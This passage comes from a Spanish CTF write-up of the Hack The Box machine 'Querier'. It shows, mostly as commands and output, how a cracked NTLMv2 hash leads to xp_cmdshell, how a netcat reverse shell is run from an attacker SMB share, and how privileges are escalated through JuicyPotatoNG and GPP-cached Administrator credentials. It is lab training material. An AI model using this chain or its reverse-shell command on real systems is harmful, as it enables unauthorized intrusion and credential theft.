+<span class="o">[</span><span class="k">*</span><span class="o">]</span> mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:5cf3053c7e8782fed4d742cc98dd3294:010100000000000080cc5d404dfcd8012e1d4aaef03691ef000000000100100055006900440064006d004c00640057000300100055006900440064006d004c0064005700020010004500740052007700630050005800520004001000450074005200770063005000580052000700080080cc5d404dfcd801060004000200000008003000300000000000000000000000003000004b66ba889951c5afb9413dc5e404c92f815228f34683d759418e78780ac9551a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003900000000000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:smbFolder<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>QUERIER<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\ </span>authenticated successfully
+</pre></table></code></div></div><p>Tenemos el hash NTLM-v2 del usuario <code class="language-plaintext highlighter-rouge">mssql-svc</code>, vamos a crackearlo john.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>❯ john <span class="nt">--show</span> <span class="nb">hash
+</span>mssql-svc:corporate568:QUERIER:aaaaaaaaaaaaaaaa:62a9279b131c5842829f5dafb121eee7:0101000000000000006f0e01d9fad80171ddca70e4f9acb9000000000100100075006400500048007a004b0077004c000300100075006400500048007a004b0077004c000200100051006900700052005a0062007a0057000400100051006900700052005a0062007a00570007000800006f0e01d9fad80106000400020000000800300030000000000000000000000000300000295e0cd3610d01db905acbe05f2fab52f3cfa4fa76e4e00a230d2f33c30d7d160a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003900000000000000000000000000
+
+1 password <span class="nb">hash </span>cracked, 0 left
+</pre></table></code></div></div><p>Con esta nueva credencial del usuario <code class="language-plaintext highlighter-rouge">mssql-sv</code> y su contraseña <code class="language-plaintext highlighter-rouge">corporate568</code> usaremos de nuevo la tool impacket-mssqlclient.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>❯ impacket-mssqlclient WORKGROUP/mssql-svc@10.10.10.125 <span class="nt">-windows-auth</span>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL&gt; 
+</pre></table></code></div></div><p>Las credenciales son validas y con este usuario si se puede habilitar el xp_cmdshell.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>SQL&gt; enable_xp_cmdshell
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL&gt; 
+</pre></table></code></div></div><p>Comprobamos ejecutando un comando.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>SQL&gt; xp_cmdshell <span class="s2">"whoami"</span>
+output                                                                             
+
+<span class="nt">--------------------------------------------------------------------------------</span>   
+
+querier<span class="se">\m</span>ssql-svc                                                                  
+
+NULL                                                                               
+</pre></table></code></div></div><h2 id="intrusion"><span class="mr-2">Intrusion.</span><a href="#intrusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Con <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> se puede ejecutar un programa como <code class="language-plaintext highlighter-rouge">netcat</code> desde un recurso compartido y asi tener una revershell , usamos <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> y nos ponemos en escuhca con <code class="language-plaintext highlighter-rouge">nc</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>SQL&gt; xp_cmdshell <span class="s2">"</span><span class="se">\\</span><span class="s2">10.10.14.9</span><span class="se">\s</span><span class="s2">mbFolder</span><span class="se">\n</span><span class="s2">c64.exe -e cmd 10.10.14.9 443"</span>
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+
+connect to <span class="o">[</span>10.10.14.9] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.125] 49684
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.292]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+<span class="nb">whoami
+</span>querier<span class="se">\m</span>ssql-svc
+</pre></table></code></div></div><h2 id="escalar-privilegios"><span class="mr-2">Escalar privilegios.</span><a href="#escalar-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Tenemos dos formas de escalar privilegios en esta maquina.</p><p>Way-1 <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt;whoami /priv
+<span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                               State   
+<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+<span class="sb">``</span>SeImpersonatePrivilege<span class="sb">``</span>        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
+</pre></table></code></div></div><p>Con SeImpersonatePrivilege se puede ejecutar comando como administrador con la tool <code class="language-plaintext highlighter-rouge">JuicyPotatoNG.exe</code></p><blockquote><p>JuicyPotatoNG.exe esta actualizada y se puede usar para windows server 2019</p></blockquote><p>Copiamos el JuicyPotatoNG.exe en la maquina victima usando de nuevo el smbserver.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\a</span>dmin&gt;copy <span class="se">\\</span>10.10.14.9<span class="se">\s</span>mbFolder<span class="se">\J</span>uicyPotatoNG.exe
+copy <span class="se">\\</span>10.10.14.9<span class="se">\s</span>mbFolder<span class="se">\J</span>uicyPotatoNG.exe
+        1 file<span class="o">(</span>s<span class="o">)</span> copied.
+</pre></table></code></div></div><p>Ejecutamos el prgorama para obtener una consola con privilegios de administrador.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>JuicyPotatoNG.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-i</span>
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>Microsoft Windows <span class="o">[</span>Version 10.0.17763.292]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\&gt;</span><span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\s</span>ystem
+</pre></table></code></div></div><p>De esta forma somos administradores.</p><p>Way-2 Credenciales almacenadas en el sistema.</p><p>Si enumeramos el sistema con <code class="language-plaintext highlighter-rouge">PowerUp.ps1</code> obtenemos una ruta con unas credenciales almacenadas en un archivo <code class="language-plaintext highlighter-rouge">xml</code></p><blockquote><p>GPP Passwords (preferencias de directivas de grupo) Cada vez que se crea una nueva preferencia de grupo, se crea un archivo xml en el recurso compartido SYSVOL con esos datos de configuracion, incluidas las contraseñas asociadas co el GPP. Por seguridad, Microsoft AES encripta la contraseña antes de almacenarla como cpassword, ¡pero luego Microsoft publico la clave en MSDN!. Se pueden decifrar con la tool <code class="language-plaintext highlighter-rouge">gpp-decrypt</code></p></blockquote><blockquote><p>El archivo xml contiene la clave encriptada <code class="language-plaintext highlighter-rouge">cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>Changed   : <span class="o">{</span>2019-01-28 23:12:48<span class="o">}</span>
+UserNames : <span class="o">{</span>Administrator<span class="o">}</span>
+NewName   : <span class="o">[</span>BLANK]
+Passwords : <span class="o">{</span>MyUnclesAreMarioAndLuigi!!1!<span class="o">}</span>
+File      : C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\G</span>roup 
+            Policy<span class="se">\H</span>istory<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>achine<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml
+Check     : Cached GPP Files
+</pre></table></code></div></div><p>Tenemos el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> y la contraseña <code class="language-plaintext highlighter-rouge">MyUnclesAreMarioAndLuigi!!1!</code>, comprobamos con crackmapexec .</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>❯ cme smb 10.10.10.125 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span> <span class="nt">-d</span> WORKGROUP
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\A</span>dministrator:MyUnclesAreMarioAndLuigi!!1! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</pre></table></code></div></div><p>En el reporte de nmap tenemos el puerto <code class="language-plaintext highlighter-rouge">5985</code> abierto , con <code class="language-plaintext highlighter-rouge">evil-winrm</code> tenemos acceso a la maquina victima.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>❯ evil-winrm <span class="nt">-i</span> 10.10.10.125 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span>
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>querier<span class="se">\a</span>dministrator
+</pre></table></code></div></div><p>De esta segunda forma somos administradores.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/sql/" class="post-tag no-text-decoration" >SQL</a> <a href="/tags/xp-cmdshell/" class="post-tag no-text-decoration" >xp_cmdshell</a> <a href="/tags/cmd/" class="post-tag no-text-decoration" >CMD</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >Powershell</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Querier+Writeup+-+Root3200&url=https%3A%2F%2Froot3200.github.io%2Fposts%2Fquerier%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Querier+Writeup+-+Root3200&u=https%3A%2F%2Froot3200.github.io%2Fposts%2Fquerier%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Froot3200.github.io%2Fposts%2Fquerier%2F&text=Querier+Writeup+-+Root3200" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/bastard/">Bastard Writeup</a><li><a href="/posts/secnotes/">SecNotes Writeup</a><li><a href="/posts/breadcrumbs/">breadcrumbs Writeup</a><li><a href="/posts/intelligence/">Intelligence Writeup</a><li><a href="/posts/Jeeves/">Jeeves Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/cmd/">CMD</a> <a class="post-tag" href="/tags/powershell/">Powershell</a> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/burpsuite/">Burpsuite</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/drupal/">Drupal</a> <a class="post-tag" href="/tags/jenkins/">Jenkins</a> <a class="post-tag" href="/tags/lfi/">LFI</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/secnotes/"><div class="card-body"> <em class="small" data-ts="1669071600" data-df="DD/MM/YYYY" > 22/11/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SecNotes Writeup</h3><div class="text-muted small"><p> SecNotes Maquina windows con SQL vulnerable, informacion de usuarios expuestas, recursos compartidos con SMB, subsistema linux con informacion de usuarios administradores. Reconocimiento. 1 nmap...</p></div></div></a></div><div class="card"> <a href="/posts/Jeeves/"><div class="card-body"> <em class="small" data-ts="1659996000" data-df="DD/MM/YYYY" > 09/08/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Jeeves Writeup</h3><div class="text-muted small"><p> Maquina windows JEEVES. En esta maquina tendremos que hacer RCE desde una aplicacion llamada JENKINS con una version vulnerable, que nos permite ejecutar comandos de windows cmd o powershell , ejec...</p></div></div></a></div><div class="card"> <a href="/posts/breadcrumbs/"><div class="card-body"> <em class="small" data-ts="1664143200" data-df="DD/MM/YYYY" > 26/09/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>breadcrumbs Writeup</h3><div class="text-muted small"><p> Maquina breadcrumbs Windows. Un servicio web al que le haremos fuzzing, rutas con directory listing, con burpsuite ejecutamos un directory trasnversal para buscar un token y una clave secreta que n...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/breadcrumbs/" class="btn btn-outline-primary" prompt="Anterior"><p>breadcrumbs Writeup</p></a> <a href="/posts/secnotes/" class="btn btn-outline-primary" prompt="Nuevo"><p>SecNotes Writeup</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/cmd/">CMD</a> <a class="post-tag" href="/tags/powershell/">Powershell</a> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/burpsuite/">Burpsuite</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/drupal/">Drupal</a> <a class="post-tag" href="/tags/jenkins/">Jenkins</a> <a class="post-tag" href="/tags/lfi/">LFI</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/root3200">Root-3200</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Hecho con <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> usando el tema <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> .</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p><button type="button" class="btn btn-primary" aria-label="Update"> Actualizar </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
